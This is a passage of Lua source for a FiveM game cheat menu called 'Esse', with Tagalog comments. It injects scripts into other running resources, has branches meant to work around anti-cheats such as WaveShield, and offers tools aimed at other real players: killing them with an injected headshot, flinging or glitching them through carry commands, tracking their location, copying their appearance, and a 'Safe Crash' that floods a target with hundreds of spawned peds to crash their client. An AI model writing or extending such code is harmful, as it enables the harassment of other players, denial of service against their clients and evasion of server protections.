                                            _g(_b("SetPedHairColor"))(myPed, hairColor, highlightColor)

                                            -- Copy all props (hats, glasses, earrings)
                                            for prop = 0, 2 do
                                                local propIndex = _g(_b("GetPedPropIndex"))(targetPed, prop)
                                                local propTexture = _g(_b("GetPedPropTextureIndex"))(targetPed, prop)
                                                if propIndex ~= -1 then
                                                    _g(_b("SetPedPropIndex"))(myPed, prop, propIndex, propTexture, true)
                                                else
                                                    _g(_b("ClearPedProp"))(myPed, prop)
                                                end
                                            end

                                            -- Copy head overlays (makeup, blemishes, etc.)
                                            for overlay = 0, 12 do
                                                local overlayValue, overlayColor, secondaryColor, opacity = _g(_b("GetPedHeadOverlay"))(targetPed, overlay)
                                                if overlayValue ~= 255 then
                                                    _g(_b("SetPedHeadOverlay"))(myPed, overlay, overlayValue, opacity)
                                                    if overlayColor ~= 0 then
                                                        _g(_b("SetPedHeadOverlayColor"))(myPed, overlay, 1, overlayColor, secondaryColor)
                                                    end
                                                end
                                            end

                                            -- Force network update so others can see
                                            _g(_b("SetNetworkIdCanMigrate"))(_g(_b("NetworkGetNetworkIdFromEntity"))(myPed), true)


                                        else

                                        end
                                    end

                                    CopyClothing(%d)
                                ]], targetServerId))
                                elseif WaveShieldStarted then
                                    Injection(targetRes, string.format([[
                                    local function findClientIdByServerId(sid)
                                        local players = GetActivePlayers()
                                        for _, pid in ipairs(players) do
                                            if GetPlayerServerId(pid) == sid then
                                                return pid
                                            end
                                        end
                                        return -1
                                    end

                                    local function CopyClothing(targetSid)
                                        local clientId = findClientIdByServerId(targetSid)
                                        if clientId == -1 then

                                            return
                                        end

                                        local targetPed = GetPlayerPed(clientId)
                                        local myPed = PlayerPedId()

                                        if DoesEntityExist(targetPed) and DoesEntityExist(myPed) then


                                            -- Copy all clothing components
                                            for comp = 0, 11 do
                                                local drawable = GetPedDrawableVariation(targetPed, comp)
                                                local texture = GetPedTextureVariation(targetPed, comp)
                                                SetPedComponentVariation(myPed, comp, drawable, texture, 0)
                                            end

                                            -- Copy face blend data
                                            local blendData = {}
                                            GetPedHeadBlendData(targetPed, blendData)
                                            SetPedHeadBlendData(myPed, blendData[1], blendData[2], blendData[3], blendData[4], blendData[5], blendData[6], blendData[7], blendData[8], blendData[9], blendData[10])

                                            -- Copy hair color
                                            local hairColor, highlightColor = GetPedHairColor(targetPed)
                                            SetPedHairColor(myPed, hairColor, highlightColor)

                                            -- Copy all props
                                            for prop = 0, 2 do
                                                local propIndex = GetPedPropIndex(targetPed, prop)
                                                local propTexture = GetPedPropTextureIndex(targetPed, prop)
                                                if propIndex ~= -1 then
                                                    SetPedPropIndex(myPed, prop, propIndex, propTexture, true)
                                                else
                                                    ClearPedProp(myPed, prop)
                                                end
                                            end

                                            -- Copy head overlays
                                            for overlay = 0, 12 do
                                                local overlayValue, overlayColor, secondaryColor, opacity = GetPedHeadOverlay(targetPed, overlay)
                                                if overlayValue ~= 255 then
                                                    SetPedHeadOverlay(myPed, overlay, overlayValue, opacity)
                                                    if overlayColor ~= 0 then
                                                        SetPedHeadOverlayColor(myPed, overlay, 1, overlayColor, secondaryColor)
                                                    end
                                                end
                                            end

                                            -- Force network update
                                            SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(myPed), true)


                                        else

                                        end
                                    end

                                    CopyClothing(%d)
                                ]], targetServerId))
                                else
                                    MachoInjectResourceRaw(targetRes, string.format([[
                                    local function findClientIdByServerId(sid)
                                        local players = GetActivePlayers()
                                        for _, pid in ipairs(players) do
                                            if GetPlayerServerId(pid) == sid then
                                                return pid
                                            end
                                        end
                                        return -1
                                    end

                                    local function CopyClothing(targetSid)
                                        local clientId = findClientIdByServerId(targetSid)
                                        if clientId == -1 then

                                            return
                                        end

                                        local targetPed = GetPlayerPed(clientId)
                                        local myPed = PlayerPedId()

                                        if DoesEntityExist(targetPed) and DoesEntityExist(myPed) then

                                            -- Copy all clothing components
                                            for comp = 0, 11 do
                                                local drawable = GetPedDrawableVariation(targetPed, comp)
                                                local texture = GetPedTextureVariation(targetPed, comp)
                                                SetPedComponentVariation(myPed, comp, drawable, texture, 0)
                                            end

                                            -- Copy face blend data
                                            local blendData = {}
                                            GetPedHeadBlendData(targetPed, blendData)
                                            SetPedHeadBlendData(myPed, blendData[1], blendData[2], blendData[3], blendData[4], blendData[5], blendData[6], blendData[7], blendData[8], blendData[9], blendData[10])

                                            -- Copy hair color
                                            local hairColor, highlightColor = GetPedHairColor(targetPed)
                                            SetPedHairColor(myPed, hairColor, highlightColor)

                                            -- Copy all props
                                            for prop = 0, 2 do
                                                local propIndex = GetPedPropIndex(targetPed, prop)
                                                local propTexture = GetPedPropTextureIndex(targetPed, prop)
                                                if propIndex ~= -1 then
                                                    SetPedPropIndex(myPed, prop, propIndex, propTexture, true)
                                                else
                                                    ClearPedProp(myPed, prop)
                                                end
                                            end

                                            -- Copy head overlays
                                            for overlay = 0, 12 do
                                                local overlayValue, overlayColor, secondaryColor, opacity = GetPedHeadOverlay(targetPed, overlay)
                                                if overlayValue ~= 255 then
                                                    SetPedHeadOverlay(myPed, overlay, overlayValue, opacity)
                                                    if overlayColor ~= 0 then
                                                        SetPedHeadOverlayColor(myPed, overlay, 1, overlayColor, secondaryColor)
                                                    end
                                                end
                                            end

                                            -- Force network update so others can see
                                            SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(myPed), true)


                                        else

                                        end
                                    end

                                    CopyClothing(%d)
                                ]], targetServerId))
                                end

                                Esse:Notify("success", "Esse", "Copied appearance! (Visible to others)", 5000)
                            end
                        },

                        {
                            type = "button",
                            label = "Kill Player",
                            desc = "Shoots the selected player in the head (no health zero fallback)",
                            icon = "ph-skull",
                            onSelect = function()
                                -- Kunin ang unang napiling player
                                local targetServerId = nil
                                for sid, checked in pairs(CPlayers) do
                                    if checked then
                                        targetServerId = sid
                                        break
                                    end
                                end

                                if not targetServerId then
                                    Esse:Notify("error", "Kill Player",
                                        "Please select a player from the list first!", 4000)
                                    return
                                end

                                Esse:Notify("info", "Kill Player", "Shooting player " .. targetServerId .. "...",
                                    3000)

                                CreateThread(function()
                                    MachoInjectResource2("AsThreadNs", "monitor", string.format([[
            local targetServerId = %d
            local targetPed = nil

            -- Hanapin ang target ped
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPed = GetPlayerPed(player)
                    break
                end
            end

            if targetPed and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed) then
                -- Siguraduhing kaya nating kontrolin (request control)
                if not NetworkHasControlOfEntity(targetPed) then
                    NetworkRequestControlOfEntity(targetPed)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(targetPed) and timeout < 20 do
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                end

                -- Weapon hash (sniper rifle)
                local weaponHash = GetHashKey("WEAPON_SNIPERRIFLE")
                -- Bone coordinates ng ulo (31086 = SKEL_Head)
                local headPos = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)

                -- Pumutok mula sa itaas ng ulo pababa
                ShootSingleBulletBetweenCoords(
                    headPos.x, headPos.y, headPos.z + 0.3,
                    headPos.x, headPos.y, headPos.z,
                    200,    -- damage
                    true,   -- trace
                    weaponHash,
                    PlayerPedId(),  -- shooter
                    true,   -- show effect
                    false,  -- p12
                    1000.0  -- distance
                )

            else
            end
        ]], targetServerId))

                                    Wait(500)
                                    Esse:Notify("success", "Kill Player",
                                        "Headshot executed on " .. targetServerId, 4000)
                                end)
                            end
                        },


                        {
                            type = "button",
                            label = "Launch Player (V1)",
                            desc = "Launch selected players using carry command",
                            onSelect = function()
                                -- Kunin ang lahat ng napiling players
                                local selectedTargets = {}
                                for sid, checked in pairs(CPlayers) do
                                    if checked then
                                        table.insert(selectedTargets, sid)
                                    end
                                end

                                if #selectedTargets == 0 then
                                    Esse:Notify("error", "Esse", "Select a player", 3000)
                                    return
                                end

                                KeyboardInput("Carry Command (e.g., carry, buhat, buhatkita)", "carry",
                                    function(carryCmd)
                                        if not carryCmd or carryCmd == "" then
                                            Esse:Notify("error", "Esse",
                                                "Enter a carry command (e.g., carry)", 3000)
                                            return
                                        end

                                        for _, targetId in ipairs(selectedTargets) do
                                            local scriptToInject = string.format([[
                local targetId = %d
                local cmd = "%s"
                local myPed = PlayerPedId()
                local originalCoords = GetEntityCoords(myPed)

                local targetIdx = GetPlayerFromServerId(targetId)
                if targetIdx == -1 then return end
                local targetPed = GetPlayerPed(targetIdx)

                if not DoesEntityExist(targetPed) then return end

                SetEntityVisible(myPed, false, false)
                SetEntityAlpha(myPed, 0, false)

                local currentPos = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                Wait(50)

                ExecuteCommand(cmd)
                Wait(100)

                local highZ = currentPos.z + 700.0
                SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, highZ, false, false, false)
                Wait(100)

                NetworkRequestControlOfEntity(targetPed)
                local timeout = 0
                while not NetworkHasControlOfEntity(targetPed) and timeout < 30 do
                    NetworkRequestControlOfEntity(targetPed)
                    Wait(10)
                    timeout = timeout + 1
                end

                FreezeEntityPosition(targetPed, true)

                ExecuteCommand(cmd)
                DetachEntity(targetPed, true, true)
                DetachEntity(myPed, true, true)
                ClearPedTasksImmediately(targetPed)
                ClearPedTasksImmediately(myPed)

                Wait(300)

                SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                SetEntityVisible(myPed, true, false)
                ResetEntityAlpha(myPed)

                Wait(200)

                FreezeEntityPosition(targetPed, false)
            ]], targetId, carryCmd)
                                            MachoInjectThread(0, "any", "", scriptToInject)
                                            Wait(500)
                                        end
                                        Esse:Notify("success", "Esse",
                                            "Launched " .. #selectedTargets .. " player(s) using V1!", 5000)
                                    end, "typeable")
                            end
                        },

                        {
                            type = "scrollable",
                            label = "Bug Player",
                            desc = "Select bug type (I-V) and apply to ALL selected players.",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Bug Player I ", "Bug Player II ", "Bug Player III ", "Bug Player IV", "Bug Player V" },
                            onSelect = function(selectedLabel)
                                -- Get all selected players
                                local selectedTargets = {}
                                for sid, checked in pairs(CPlayers) do
                                    if checked then
                                        table.insert(selectedTargets, sid)
                                    end
                                end
                                if #selectedTargets == 0 then
                                    self:Notify("error", "Esse", "No player selected!", 3000)
                                    return
                                end

                                -- Determine which bug version (1-5)
                                local bugIndex = 1
                                local bugNames = {
                                    "Bug Player I",
                                    "Bug Player II",
                                    "Bug Player III",
                                    "Bug Player IV",
                                    "Bug Player V"
                                }
                                for i, name in ipairs(bugNames) do
                                    if name == selectedLabel then
                                        bugIndex = i
                                        break
                                    end
                                end

                                -- Ask for carry command once
                                KeyboardInput("Carry Command (e.g., carry, drag, cuff)", "carry", function(carryCmd)
                                    if not carryCmd or carryCmd == "" then
                                        self:Notify("error", "Esse", "No command provided!", 3000)
                                        return
                                    end

                                    -- Loop through each target
                                    for _, targetServerId in ipairs(selectedTargets) do
                                        local script = nil
                                        if bugIndex == 1 then
                                            -- Bug I (Lift & Drop)
                                            script = string.format([[
                    local targetId = %d
                    local cmd = "%s"
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            SetEntityVisible(myPed, false, false)
                            SetEntityAlpha(myPed, 0, false)

                            local targetPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, targetPos.z - 1.3, false, false, false)
                            Wait(50)

                            ExecuteCommand(cmd) -- Carry
                            Wait(80)

                            local highZ = targetPos.z + 30.0
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, highZ, false, false, false)
                            Wait(80)

                            local groundZ = targetPos.z - 2.0
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, groundZ, false, false, false)
                            SetEntityVelocity(myPed, 0.0, 0.0, -20.0)
                            Wait(50)

                            ExecuteCommand(cmd) -- Uncarry
                            Wait(50)

                            DetachEntity(targetPed, true, true)
                            SetPedToRagdoll(targetPed, 5000, 5000, 0, false, false, false)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)
                        end
                    end
                ]], targetServerId, carryCmd)
                                        elseif bugIndex == 2 then
                                            -- Bug II (Swap Positions)
                                            script = string.format([[
                    local targetId = %d
                    local cmd = "%s"
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            SetEntityVisible(myPed, false, false)
                            SetEntityAlpha(myPed, 0, false)

                            local targetPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, targetPos.z - 1.3, false, false, false)
                            Wait(50)

                            ExecuteCommand(cmd)
                            Wait(80)

                            local targetCurrentPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(targetPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityCoordsNoOffset(myPed, targetCurrentPos.x, targetCurrentPos.y, targetCurrentPos.z, false, false, false)
                            Wait(80)

                            ExecuteCommand(cmd)
                            Wait(50)

                            DetachEntity(targetPed, true, true)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)
                        end
                    end
                ]], targetServerId, carryCmd)
                                        elseif bugIndex == 3 then
                                            -- Bug III (Invis Bug)
                                            script = string.format([[
                    local targetId = %d
                    local cmd = "%s"
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            local currentPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                            Wait(200)

                            ExecuteCommand(cmd)
                            Wait(400)

                            SetEntityVisible(myPed, false, false)
                            Wait(200)

                            ExecuteCommand(cmd)

                            NetworkRequestControlOfEntity(targetPed)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(targetPed) and timeout < 15 do
                                NetworkRequestControlOfEntity(targetPed)
                                Wait(5)
                                timeout = timeout + 1
                            end
                            DetachEntity(targetPed, true, true)
                            ClearPedTasksImmediately(targetPed)
                            Wait(300)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            Wait(200)

                            SetEntityVisible(myPed, true, false)
                            ClearPedTasksImmediately(myPed)
                        end
                    end
                ]], targetServerId, carryCmd)
                                        elseif bugIndex == 4 then
                                            -- Bug IV (Lift + Ragdoll)
                                            script = string.format([[
                    local targetId = %d
                    local cmd = "%s"
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            SetEntityVisible(myPed, false, false)
                            SetEntityAlpha(myPed, 0, false)

                            local currentPos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                            Wait(50)

                            ExecuteCommand(cmd)
                            Wait(100)

                            local upPos = GetEntityCoords(myPed)
                            SetEntityCoordsNoOffset(myPed, upPos.x, upPos.y, upPos.z + 15.0, false, false, false)
                            Wait(100)

                            ExecuteCommand(cmd)
                            Wait(200)

                            NetworkRequestControlOfEntity(targetPed)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(targetPed) and timeout < 20 do
                                NetworkRequestControlOfEntity(targetPed)
                                Wait(10)
                                timeout = timeout + 1
                            end
                            DetachEntity(targetPed, true, true)

                            for i = 1, 5 do
                                if IsEntityAttachedToEntity(targetPed, myPed) then
                                    DetachEntity(targetPed, true, true)
                                    Wait(50)
                                else
                                    break
                                end
                            end

                            SetPedToRagdoll(targetPed, 3000, 3000, 0, false, false, false)
                            FreezeEntityPosition(targetPed, true)
                            Wait(100)

                            SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)

                            Wait(1000)
                            FreezeEntityPosition(targetPed, false)
                            SetEntityVisible(targetPed, true, false)
                            ResetEntityAlpha(targetPed)
                        end
                    end
                ]], targetServerId, carryCmd)
                                        elseif bugIndex == 5 then
                                            -- Bug V (Jiggle 2x)
                                            script = string.format([[
                    local targetId = %d
                    local cmd = "%s"
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            for i = 1, 2 do
                                SetEntityVisible(myPed, false, false)
                                SetEntityAlpha(myPed, 0, false)

                                local currentPos = GetEntityCoords(targetPed)
                                SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                Wait(50)
                                ExecuteCommand(cmd)
                                Wait(50)

                                local offsetX = (i == 1 and 30.0 or -30.0)
                                local movePos = GetEntityCoords(myPed)
                                SetEntityCoordsNoOffset(myPed, movePos.x + offsetX, movePos.y, movePos.z + 15.0, false, false, false)
                                Wait(80)

                                ExecuteCommand(cmd)
                                Wait(150)

                                NetworkRequestControlOfEntity(targetPed)
                                local timeout = 0
                                while not NetworkHasControlOfEntity(targetPed) and timeout < 20 do
                                    NetworkRequestControlOfEntity(targetPed)
                                    Wait(10)
                                    timeout = timeout + 1
                                end
                                DetachEntity(targetPed, true, true)

                                Wait(100)
                                SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                SetEntityVisible(myPed, true, false)
                                ResetEntityAlpha(myPed)
                                Wait(80)
                            end

                            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)
                        end
                    end
                ]], targetServerId, carryCmd)
                                        end

                                        if script then
                                            MachoInjectThread(0, "monitor", "", script)
                                            Wait(500)
                                        end
                                    end

                                    self:Notify("success", "Esse",
                                        "Applied " .. selectedLabel .. " to " .. #selectedTargets .. " player(s)!",
                                        5000)
                                end, "typeable")
                            end
                        },







                        { type = "divider", label = "Navigation" },
                        {
                            type = "button",
                            label = "Waypoint to Player",
                            desc = 'Set GPS waypoint to player location',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local coords = GetEntityCoords(GetPlayerPed(player))
                                        SetNewWaypoint(coords.x, coords.y)
                                        self:Notify("success", "Esse",
                                            ("Waypoint set to %s"):format(GetPlayerName(player) or targetPlayer),
                                            3000)
                                    else
                                        self:Notify("error", "Esse", "Player not found!", 3000)
                                    end
                                else
                                    self:Notify("error", "Esse", "You must select a player!", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Track Player (Blip)",
                            checked = false,
                            desc = 'Show persistent blip on map',
                            onSelect = function(checked)
                                local targetPlayer = nil
                                for serverId, c in pairs(CPlayers) do
                                    if c then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if not targetPlayer then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                if checked then
                                    if not _G.EsseTrackedPlayers then _G.EsseTrackedPlayers = {} end
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local blip = AddBlipForEntity(GetPlayerPed(player))
                                        SetBlipSprite(blip, 1)
                                        SetBlipColour(blip, 1)
                                        SetBlipScale(blip, 0.8)
                                        _G.EsseTrackedPlayers[targetPlayer] = blip
                                        self:Notify("success", "Esse", "Tracking player!", 3000)
                                    end
                                else
                                    if _G.EsseTrackedPlayers and _G.EsseTrackedPlayers[targetPlayer] then
                                        RemoveBlip(_G.EsseTrackedPlayers[targetPlayer])
                                        _G.EsseTrackedPlayers[targetPlayer] = nil
                                        self:Notify("success", "Esse", "Stopped tracking!", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Show Distance",
                            desc = 'Display distance to player',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local dist = #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(GetPlayerPed(player)))
                                        self:Notify("info", "Esse", ("Distance: %.1f meters"):format(dist), 5000)
                                    end
                                else
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                end
                            end
                        },
                        { type = "divider", label = "Player Info" },
                        {
                            type = "button",
                            label = "Copy Server ID",
                            desc = 'Display player server ID',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if targetPlayer then
                                    self:Notify("success", "Esse", ("Server ID: %s"):format(targetPlayer), 8000)
                                else
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Copy Player Name",
                            desc = 'Display player name',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if targetPlayer then
                                    local name = GetPlayerName(GetPlayerFromServerId(targetPlayer)) or "Unknown"
                                    self:Notify("success", "Esse", ("Name: %s"):format(name), 8000)
                                else
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Player Info Panel",
                            desc = 'Show detailed player info',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local ped = GetPlayerPed(player)
                                        local hp = GetEntityHealth(ped)
                                        local armor = GetPedArmour(ped)
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        local vehName = veh ~= 0 and
                                        GetDisplayNameFromVehicleModel(GetEntityModel(veh)) or "On Foot"
                                        self:Notify("info", "Esse",
                                            ("HP: %d | Armor: %d | %s"):format(hp, armor, vehName), 6000)
                                    end
                                else
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Copy Vehicle",
                            desc = 'Spawn copy of their vehicle',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local theirVeh = GetVehiclePedIsIn(GetPlayerPed(player), false)
                                        if theirVeh ~= 0 then
                                            local model = GetEntityModel(theirVeh)
                                            local myCoords = GetEntityCoords(PlayerPedId())
                                            RequestModel(model)
                                            while not HasModelLoaded(model) do Wait(100) end
                                            local veh = CreateVehicle(model, myCoords.x + 3.0, myCoords.y, myCoords
                                            .z, GetEntityHeading(PlayerPedId()), true, false)
                                            SetVehicleOnGroundProperly(veh)
                                            self:Notify("success", "Esse", "Vehicle copied!", 3000)
                                        else
                                            self:Notify("error", "Esse", "Player not in vehicle!", 3000)
                                        end
                                    end
                                else
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Copy Outfit",
                            desc = 'Clone player appearance',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local theirPed = GetPlayerPed(player)
                                        local myPed = PlayerPedId()
                                        for i = 0, 11 do
                                            local drawable = GetPedDrawableVariation(theirPed, i)
                                            local texture = GetPedTextureVariation(theirPed, i)
                                            SetPedComponentVariation(myPed, i, drawable, texture, 0)
                                        end
                                        for i = 0, 7 do
                                            local prop = GetPedPropIndex(theirPed, i)
                                            local propTex = GetPedPropTextureIndex(theirPed, i)
                                            if prop ~= -1 then
                                                SetPedPropIndex(myPed, i, prop, propTex, true)
                                            else
                                                ClearPedProp(myPed, i)
                                            end
                                        end
                                        self:Notify("success", "Esse", "Outfit copied!", 3000)
                                    end
                                else
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Clone Player (NPC)",
                            desc = 'Spawn NPC clone of player',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end
                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local theirPed = GetPlayerPed(player)
                                        local model = GetEntityModel(theirPed)
                                        local coords = GetEntityCoords(PlayerPedId())
                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(100) end
                                        local clone = CreatePed(4, model, coords.x + 2.0, coords.y, coords.z,
                                            GetEntityHeading(theirPed), true, false)
                                        for i = 0, 11 do
                                            SetPedComponentVariation(clone, i, GetPedDrawableVariation(theirPed, i),
                                                GetPedTextureVariation(theirPed, i), 0)
                                        end
                                        for i = 0, 7 do
                                            local prop = GetPedPropIndex(theirPed, i)
                                            if prop ~= -1 then SetPedPropIndex(clone, i, prop,
                                                    GetPedPropTextureIndex(theirPed, i), true) end
                                        end
                                        self:Notify("success", "Esse", "Clone spawned!", 3000)
                                    end
                                else
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                end
                            end
                        },
                    }
                },
                {
                    label = "Trolling",
                    tabs = {
                        {
                            type = "button",
                            label = "Safe Crash",
                            desc = "Teleport yourself 400m away + 1500m up, then spawn hundreds of peds on target.",
                            onSelect = function()
                                local targetServerId = nil
                                for sid, checked in pairs(CPlayers) do
                                    if checked then
                                        targetServerId = sid
                                        break
                                    end
                                end
                                if not targetServerId then
                                    self:Notify("error", "Esse", "Pumili muna ng isang player!", 3000)
                                    return
                                end

                                KeyboardInput("Ped Model (e.g., player_zero, a_c_chop)", "player_zero",
                                    function(selectedModel)
                                        if not selectedModel or selectedModel == "" then
                                            selectedModel = "player_zero"
                                        end
                                        local pModelHash = GetHashKey(selectedModel)

                                        -- Teleport horizontally + 400m up
                                        local myPed = PlayerPedId()
                                        local myPos = GetEntityCoords(myPed)
                                        local angle = math.rad(math.random(0, 360))
                                        local hDist = 120.0
                                        local targetX = myPos.x + math.cos(angle) * hDist
                                        local targetY = myPos.y + math.sin(angle) * hDist
                                        local firstZ = myPos.z + 400.0

                                        SetEntityCoords(myPed, targetX, targetY, firstZ, false, false, false, false)
                                        GiveWeaponToPed(myPed, GetHashKey("GADGET_PARACHUTE"), 1, false, true)
                                        Citizen.Wait(200)

                                        -- Tamang template (na-escape na ang %)
                                        local template = [[
            _G.nukeLoop = _G.nukeLoop or {}
            local tID = %d
            local mH = %d
            _G.nukeLoop[tID] = true

            Citizen.CreateThread(function()
                RequestModel(mH)
                local wait = 0
                while not HasModelLoaded(mH) and wait < 50 do
                    Citizen.Wait(100)
                    wait = wait + 1
                end
                if not HasModelLoaded(mH) then return end

                while _G.nukeLoop[tID] do
                    local targetPed = 0
                    local players = GetActivePlayers()
                    for i=1, #players do
                        local p = players[i]
                        if GetPlayerServerId(p) == tID then
                            targetPed = GetPlayerPed(p)
                            break
                        end
                    end

                    if targetPed ~= 0 and DoesEntityExist(targetPed) then
                        local pos = GetEntityCoords(targetPed)
                        for batch = 1, 10 do
                            if not _G.nukeLoop[tID] then break end
                            for i = 1, 50 do
                                if not _G.nukeLoop[tID] then break end
                                local offsetX = math.random(-3, 3) + 0.0
                                local offsetY = math.random(-3, 3) + 0.0
                                local ped = CreatePed(4, mH, pos.x + offsetX, pos.y + offsetY, pos.z, 0.0, true, true)
                                if DoesEntityExist(ped) then
                                    SetEntityAsMissionEntity(ped, true, true)
                                    SetPedCanRagdoll(ped, true)
                                    SetBlockingOfNonTemporaryEvents(ped, true)
                                end
                                if i %% 10 == 0 then Citizen.Wait(0) end
                            end
                            Citizen.Wait(50)
                        end
                        _G.nukeLoop[tID] = nil
                    else
                        _G.nukeLoop[tID] = nil
                    end
                end
            end)
        ]]
                                        local finalScript = string.format(template, targetServerId, pModelHash)
                                        MachoInjectResource2("AsThreadNs", "monitor", finalScript)
                                        Citizen.Wait(500)

